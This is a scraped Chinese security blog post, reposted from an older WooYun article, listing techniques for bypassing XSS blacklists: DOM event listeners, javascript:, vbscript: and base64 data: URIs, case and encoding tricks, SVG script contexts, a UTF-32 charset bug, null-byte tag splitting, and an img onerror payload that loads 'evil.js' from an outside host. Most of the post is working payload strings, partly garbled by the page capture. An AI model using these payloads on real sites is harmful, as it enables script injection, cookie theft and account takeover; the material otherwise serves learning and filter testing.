<p>非常规的事件监听<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";document.body.addEventListener("</span>DOMActivate",alert(1))<span class="comment">//</span></span><br><span class="line"><span class="string">";document.body.addEventListener("</span>DOMActivate",prompt(1))<span class="comment">//</span></span><br><span class="line"><span class="string">";document.body.addEventListener("</span>DOMActivate",<span class="keyword">confirm</span>(1))<span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
<p>下面是一些相同的类：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">DOMAttrModified</span></span><br><span class="line">DOMCharacterDataModified</span><br><span class="line">DOMFocusIn</span><br><span class="line">DOMFocusOut</span><br><span class="line">DOMMouseScroll</span><br><span class="line">DOMNodeInserted</span><br><span class="line">DOMNodeInsertedIntoDocument</span><br><span class="line">DOMNodeRemoved</span><br><span class="line">DOMNodeRemovedFromDocument</span><br><span class="line">DOMSubtreeModified</span><br></pre></td></tr></table></figure></p>
<p>HREF内容可控<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"Userinput"</span>&gt;</span>Click<span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>可控的是Userinput那里我们需要做的只是把javascript代码输入就好了：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:<span class="function"><span class="title">alert</span><span class="params">(<span class="number">1</span>)</span></span><span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
<p>最后组合为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"javascript:alert(1)//"</span>&gt;</span>Click<span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>使用HTML实体URL编码绕过黑名单，href里会自动实体解码，如果都失败了，可以尝试使用vbscript在IE10以下都有效，或者使用data协议。</p>
<p>JavaScript变换</p>
<p>使用javascript协议时可使用的例子：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">javascript</span>:<span class="value"><span class="function">alert</span>(<span class="number">1</span>)</span><br><span class="line">javaSCRIPT:<span class="function">alert</span>(<span class="number">1</span>)</span><br><span class="line">JaVaScRipT:<span class="function">alert</span>(<span class="number">1</span>)</span><br><span class="line">javas	cript:\<span class="function">u0061lert</span>(<span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="rule"><span class="attribute">javascript</span>:<span class="value">\<span class="function">u0061lert</span>(<span class="number">1</span>)</span><br><span class="line">javascript:<span class="function">alert</span>(document.cookie)</span></span></span><br></pre></td></tr></table></figure></p>
<p>Vbscript变换<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">vbscript</span>:<span class="value"><span class="function">alert</span>(<span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="rule"><span class="attribute">vbscript</span>:<span class="value"><span class="function">alert</span>(<span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="tag">vbscr</span>	<span class="rule"><span class="attribute">ipt</span>:<span class="value"><span class="function">alert</span>(<span class="number">1</span>)<span class="string">"</span></span></span></span><br></pre></td></tr></table></figure></p>
<p>Data URl<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/html;base<span class="number">64</span>,PH<span class="label">NjcmlwdD5</span>hbGVydCgxKTw<span class="title">vc2</span><span class="label">NyaXB0</span>Pg==</span><br></pre></td></tr></table></figure></p>
<p>当你的输入会在encodeURIComponent当中显示出来的时候，很容易插入xss代码了</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#10;userinput&#22788;&#21487;&#25511;&#65292;&#27979;&#35797;&#20195;&#30721;&#65306;</span><br></pre></td></tr></table></figure>
<p>-alert(1)-<br>-prompt(1)-<br>-confirm(1)-<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最终结果：</span><br></pre></td></tr></table></figure></p>
<p>encodeURIComponent(“-alert(1)-“)<br>encodeURIComponent(“-prompt(1)-“)<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SVG标签</span><br><span class="line"></span><br><span class="line">当返回结果在svg标签中的时候，会有一个特性</span><br></pre></td></tr></table></figure></p>
<p><svg><script>varmyvar=”YourInput”;</script><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YourInput可控，输入</span><br></pre></td></tr></table></figure></p>
<p>www.site.com/test.php?var=text”;alert(1)//<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果把<span class="string">"编码一些他仍然能够执行:</span></span><br></pre></td></tr></table></figure></p>
<p><svg><script>varmyvar=”text”;alert(1)//“;</script></svg><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">浏览器bug</span><br><span class="line"></span><br><span class="line">字符集的bug在IE中出现过很多次，第一个就是UTF-7，但是这个只在之前的版本中可用，现在讨论一个在现在的浏览器当中可以执行的javascript。</span><br><span class="line"></span><br><span class="line">http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSS</span><br><span class="line">这个页面当中我们可控当前页面的字符集，当我们常规的测试时：</span><br><span class="line"></span><br><span class="line">http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v="&gt;<span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">x</span> <span class="attribute">onerror</span>=<span class="value">prompt(0);</span>&gt;</span></span><br><span class="line">返回结果可以看到双引号被编码了：</span><br></pre></td></tr></table></figure></p>
<p><html></html></p>
<p><meta charset="utf-8"></p>
<p><body></body></p>
<p><input type="text" value=""><img src="x" onerror="prompt(0);">“&gt;<br><br><br>设置字符集为UTF-32：</p>
<p>http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上面这个在IE9及以下版本可以执行成功。</span><br><span class="line"></span><br><span class="line">利用<span class="number">0</span>字节绕过：</span><br></pre></td></tr></table></figure></p>
<p><scri%00pt>alert(1);</scri%00pt></p>
<p><scri\x00pt>alert(1);<br><s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t><br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在IE9及以下版本有效。</span><br><span class="line"></span><br><span class="line">其他等等一系列浏览器特性的XSS可以参考以下文章：</span><br><span class="line"></span><br><span class="line"><span class="label">http:</span>//drops.wooyun<span class="preprocessor">.org</span>/tips/<span class="number">147</span></span><br><span class="line"></span><br><span class="line">增加了一个比较好玩的 payload :</span><br></pre></td></tr></table></figure></scri\x00pt></p>
<p><img src="1" onerror="s=document.createElement('script');s.src='//7sbs9y.com1.z0.glb.clouddn.com/evil.js';document.body.appendChild(s);" <figure="" class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">再新增了一个：</span><br></pre></td></tr></table></p>
<p><awesome id="lol" onfocus="alert(1)" tabindex="0"><br>```<br>通过这个技巧可以在任何标签（包括未知标签）内实现无需交互的XSS攻击（在Firefox以外的浏览器有效）</awesome></p>
<h4 id="0x02_总结">0x02 总结</h4><p>本文主要是一个测试XSS的思路流程，并没有把所有的payload写全，其实也没有人能够写全，只是列了一个大体的框架，大家实际在寻找的过程中可以不断慢慢的根据这种思路补充自己的payload，想必呢，一定会有很大的进步的！~</p>
<p>原文 http://drops.wooyun.org/tips/845  乌云上的老文章了，因为有时候一些记不住，转载过来只为学习使用</p>
<p>另外推荐一篇整理的也不错 http://insight-labs.org/?p=533</p>
</span>
      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/xss/" rel="tag">#xss</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-prev post-nav-item">
            
              <a href="/2014/09/15/Bypass xss过滤的测试方法/" rel="prev">Bypass xss过滤的测试方法</a>
            
          </div>

          <div class="post-nav-next post-nav-item">
            
              <a href="/2014/09/13/纯 CSS 制作的居中弹出层/" rel="next">纯 CSS 制作的居中弹出层</a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

 </div>

        

        
          <div class="comments" id="comments">
            
              <div id="disqus_thread">
                <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
              </div>
            
          </div>
        
      </div>

      
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/tx.jpg" alt="Go7hic" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Go7hic</p>
        </div>
        <p class="site-description motion-element" itemprop="description">jsut 4 fun</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">118</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            
              <span class="site-state-item-count">0</span>
              <span class="site-state-item-name">分类</span>
              
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">27</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="menu-item-icon icon-next-feed"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
        </div>

      </section>

      
        <section class="post-toc-wrap sidebar-panel-active">
          <div class="post-toc-indicator-top post-toc-indicator"></div>
          <div class="post-toc">
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00_背景"><span class="nav-number">1.</span> <span class="nav-text">0x00 背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01_Bypassing黑名单"><span class="nav-number">2.</span> <span class="nav-text">0x01 Bypassing黑名单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02_总结"><span class="nav-number">3.</span> <span class="nav-text">0x02 总结</span></a></li></ol></div>
            
          </div>
          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
        </section>
      

    </div>
  </aside>


    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner"> <div class="copyright" >
  
  &copy; &nbsp; 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="icon-next-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Go7hic</span>
</div>

<div class="">
  「万物之中，希望至美；至美之物，永不凋零」
</div>

 </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  
  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'g07hic';
      var disqus_identifier = '2014/09/15/2014-09-15-Bypass xss 过滤的测试方法/';
      var disqus_title = 'Bypass xss 过滤的测试方法';
      var disqus_url = 'http://blog.yongyuan.us/2014/09/15/2014-09-15-Bypass xss 过滤的测试方法/';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
        run_disqus_script('embed.js');
      
    </script>
  


  
  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
  

  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>




  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  
<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>


<script type="text/javascript" id="sidebar.toc.highlight">
  $(document).ready(function () {
    var tocSelector = '.post-toc';
    var $tocSelector = $(tocSelector);
    var activeCurrentSelector = '.active-current';

    $tocSelector
      .on('activate.bs.scrollspy', function () {
        var $currentActiveElement = $(tocSelector + ' .active').last();

        removeCurrentActiveClass();
        $currentActiveElement.addClass('active-current');

        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
      })
      .on('clear.bs.scrollspy', function () {
        removeCurrentActiveClass();
      });

    function removeCurrentActiveClass () {
      $(tocSelector + ' ' + activeCurrentSelector)
        .removeClass(activeCurrentSelector.substring(1));
    }

    function processTOC () {
      getTOCMaxHeight();
      toggleTOCOverflowIndicators();
    }

    function getTOCMaxHeight () {
      var height = $('.sidebar').height() -
                   $tocSelector.position().top -
                   $('.post-toc-indicator-bottom').height();

      $tocSelector.css('height', height);

      return height;
    }

    function toggleTOCOverflowIndicators () {
      tocOverflowIndicator(
        '.post-toc-indicator-top',
        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
      );

      tocOverflowIndicator(
        '.post-toc-indicator-bottom',
        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
      )
    }

    $(document).on('sidebar.motion.complete', function () {
      processTOC();
    });

    $('body').scrollspy({ target: tocSelector });
    $(window).on('resize', function () {
      if ( $('.sidebar').hasClass('sidebar-active') ) {
        processTOC();
      }
    });

    onScroll($tocSelector);

    function onScroll (element) {
      element.on('mousewheel DOMMouseScroll', function (event) {
          var oe = event.originalEvent;
          var delta = oe.wheelDelta || -oe.detail;

          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
          event.preventDefault();

          toggleTOCOverflowIndicators();
      });
    }

    function tocOverflowIndicator (indicator, action) {
      var $indicator = $(indicator);
      var opacity = action === 'show' ? 0.4 : 0;
      $indicator.velocity ?
        $indicator.velocity('stop').velocity({
          opacity: opacity
        }, { duration: 100 }) :
        $indicator.stop().animate({
          opacity: opacity
        }, 100);
    }

  });
</script>

<script type="text/javascript" id="sidebar.nav">
  $(document).ready(function () {
    var html = $('html');
    var TAB_ANIMATE_DURATION = 200;
    var hasVelocity = $.isFunction(html.velocity);

    $('.sidebar-nav li').on('click', function () {
      var item = $(this);
      var activeTabClassName = 'sidebar-nav-active';
      var activePanelClassName = 'sidebar-panel-active';
      if (item.hasClass(activeTabClassName)) {
        return;
      }

      var currentTarget = $('.' + activePanelClassName);
      var target = $('.' + item.data('target'));

      hasVelocity ?
        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
          target
            .velocity('stop')
            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
            .addClass(activePanelClassName);
        }) :
        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
          currentTarget.hide();
          target
            .stop()
            .css({'opacity': 0, 'display': 'block'})
            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
              currentTarget.removeClass(activePanelClassName);
              target.addClass(activePanelClassName);
            });
        });

      item.siblings().removeClass(activeTabClassName);
      item.addClass(activeTabClassName);
    });

    $('.post-toc a').on('click', function (e) {
      e.preventDefault();
      var targetSelector = escapeSelector(this.getAttribute('href'));
      var offset = $(targetSelector).offset().top;
      hasVelocity ?
        html.velocity('stop').velocity('scroll', {
          offset: offset  + 'px',
          mobileHA: false
        }) :
        $('html, body').stop().animate({
          scrollTop: offset
        }, 500);
    });

    // Expand sidebar on post detail page by default, when post has a toc.
    var $tocContent = $('.post-toc-content');
    if (isDesktop() && CONFIG.sidebar === 'post') {
      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
        displaySidebar();
      }
    }
  });
</script>



  <script type="text/javascript">
    $(document).ready(function () {
      if (CONFIG.sidebar === 'always') {
        displaySidebar();
      }
      if (isMobile()) {
        FastClick.attach(document.body);
      }
    });
  </script>

  

  
  

  
  <script type="text/javascript" src="/js/lazyload.js"></script>
  <script type="text/javascript">
    $(function () {
      $("#posts").find('img').lazyload({
        placeholder: "/images/loading.gif",
        effect: "fadeIn"
      });
    });
  </script>
</body>
</html>
